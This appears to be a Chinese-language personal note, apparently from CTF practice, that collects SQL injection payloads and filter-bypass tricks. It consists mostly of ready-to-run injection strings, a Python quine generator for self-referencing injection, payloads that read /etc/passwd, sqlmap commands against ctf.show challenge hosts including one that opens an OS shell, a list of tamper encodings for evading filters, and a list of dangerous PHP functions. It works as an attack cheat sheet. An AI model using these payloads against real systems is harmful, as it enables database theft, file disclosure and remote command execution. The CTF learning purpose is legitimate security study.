##  前言

记录自己看过比较好的文章，总结下

## 注入类型

1.`union注入`

```
1' and 1=2 union select 1,2,3 #
```

2.布尔盲注

```
1 'and length(database())>=1
```

3.时间盲注

```
1 'and  if(length(database())>=5,sleep(5),1)
```

4.堆叠注入

```
1;select if (substr(user(),1,1)='e',sleep(3),1)
```

5.UA注入，xff注入,cookie注入和refer注入

```
referer：id=1
User-Agent:id=1
X-Forwarded-For:id=1
cookie：id=1
```

##  绕过过滤关键字

###  编码绕过

用hex编码，base64编码

```
-1' union select to_base64(username),hex(password) from ctfshow_user2 --+
```

###  符号绕过

```
str_replace将关键字变为空，利用双写绕过或者大小写绕过
空格过滤，利用内联注释/**/或者%09
 =过滤，利用like绕过
```

##  其他的一些绕过姿势

1.自查询

```
function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}
 $sql="SELECT password FROM users WHERE username='admin' and password='$password';";

```

payload:

username=admin&password=下面得到的字符串

```
def quine(data, debug=True):
    if debug: print(data)
    data = data.replace('@@',"REPLACE(REPLACE(@@,CHAR(34),CHAR(39)),CHAR(64),@@)")
    blob = data.replace('@@','"@"').replace("'",'"')
    data = data.replace('@@',"'"+blob+"'")
    if debug: print(data)
    return data

result = quine("'UNION/**/SELECT/**/@@/**/AS/**/z3eyond#")

```

2.直接读取文件

```
-1' union select 1,2,load_file("/etc/passwd")#

0' union select 1,2,3,4,5;create table z3eyond(t text); load data local infile '/etc/passwd' INTO TABLE z3eyond LINES TERMINATED BY '\n'--+
```

##  其他特性

```
python3 sqlmap.py -u "http://b1d4f326-6563-43d1-8da7-a2d3e7d94c8a.challenge.ctf.show/api/index.php" --data="id=1" --method=PUT --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://b1d4f326-6563-43d1-8da7-a2d3e7d94c8a.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=space2comment --dbs
```

```
python3 sqlmap.py -u "http://4759bb03-077a-49c8-9cde-e41b351f8d36.challenge.ctf.show:8080/api/index.php" --data="id=1" --method=PUT --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://4759bb03-077a-49c8-9cde-e41b351f8d36.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=dotast --os-shell
```

##  实现的内容：

```
1.对整个内容进行base64编码

2.`'`->`%00%27`url编码

3.between替换大于小于等于

4.binary二进制比较

5.空格为%09，=为LIKE字符替换

6.全部字符二次url编码

7.全部字符一次url编码

8.全部unicode字符

9.LIMIT 2, 3->LIMIT 3 OFFSET 2

10.MID(VERSION(), 1, 1)->MID(VERSION() FROM 1 FOR 1)

11.空格->`/**/`,`/**_**/`

12.CONCAT(1,2)->CONCAT_WS(MID(CHAR(0),0,0),1,2)

14.=  -> LIKE  or RLIKE

15.'1" AND SLEEP(5)#'   --> `'1\\\\" AND SLEEP(5)#'`

16.'1 AND A > B'    -->`'1 AND GREATEST(A,B+1)=A'`

17.`SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))`利用char

18.html编码 "1' AND SLEEP(5)#"  -> `1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;`

19.'1 AND A > B' ->'1 AND LEAST(A,B+1)=B+1'

20.大小写绕过

21.'1 AND 2>1--'   ->  `'1 /*!30963AND 2>1*/--'`

22.`'1 AND 2>1--'` -->`'1 /*!00000AND 2>1*/--'`

23.多个空格绕过

24.UTF编码

25.`tamper('SLEEP(5)') == "GET_LOCK('%s',5)" % kb.aliasName`

26.增加`X-Forwarded-For`功能
```

```
python3 sqlmap.py -u "http://7268be27-8bd3-43ae-a278-ffa18cef2781.challenge.ctf.show:8080/api/index.php" --data="id=1" --method=PUT --referer="ctf.show" --headers="Content-Type:text/plain" --safe-url="http://7268be27-8bd3-43ae-a278-ffa18cef2781.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=space2comment --dbs
```

```
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir
```





